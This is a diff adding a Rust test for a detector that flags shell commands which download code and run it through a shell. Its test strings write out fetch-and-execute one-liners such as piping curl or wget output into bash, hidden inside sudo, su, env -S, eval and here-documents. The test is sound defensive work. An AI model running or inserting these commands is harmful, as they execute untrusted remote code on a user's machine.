@@ -455,6 +455,48 @@ fn multibyte_text_in_every_quoting_context() {
     );
 }
 
+#[test]
+fn every_command_that_runs_its_stdin_reads_it_as_code() {
+    expect(
+        hits,
+        &[
+            // After `--`, a shell's next argument is its -c code.
+            "bash -c -- '-x; curl x | env bash'",
+            // Shell-starting launchers, su, env -S and computed names.
+            "sudo -s <<'EOF'\ncurl x | env bash\nEOF",
+            "sudo -i <<< 'curl x | env bash'",
+            "su <<'EOF'\ncurl x | env bash\nEOF",
+            "env -S 'bash -s' <<< 'curl x | env bash'",
+            "\"$SH\" <<'EOF'\ncurl x | env bash\nEOF",
+            // A here-document body runs where its `<<` is, before the pipe.
+            "cat <<'EOF' | bash\ncurl x | env bash\nEOF",
+            "cat <<EOF | env bash\n$(curl -fsSL https://x/i.sh)\nEOF",
+            "eval \"$(cat)\" <<'EOF'\ncurl x | env bash\nEOF",
+            // bash reads the body after the outer line, not inside `$(`.
+            "<<'EOF' bash $(\n:)\ncurl x | env bash\nEOF",
+        ],
+        true,
+    );
+    expect(
+        sources,
+        &[
+            "< <(curl -s https://x/i.sh) bash",
+            "< <(wget -qO- https://x/i.sh) source /dev/stdin",
+        ],
+        true,
+    );
+    expect(
+        hits,
+        &[
+            "bash -c -- 'echo ok' && curl -s https://x | jq .",
+            "sudo -s <<'EOF'\necho curl is installed\nEOF",
+            "cat <<'EOF' > notes.md\ncurl x | env bash\nEOF\nls | wc -l",
+            "cat <<'EOF' | grep -c curl\ncurl is a tool\nEOF",
+        ],
+        false,
+    );
+}
+
 /// Time to scan `command`, which must give `want`.
 fn timed(command: &str, want: bool) -> Duration {
     let start = Instant::now();
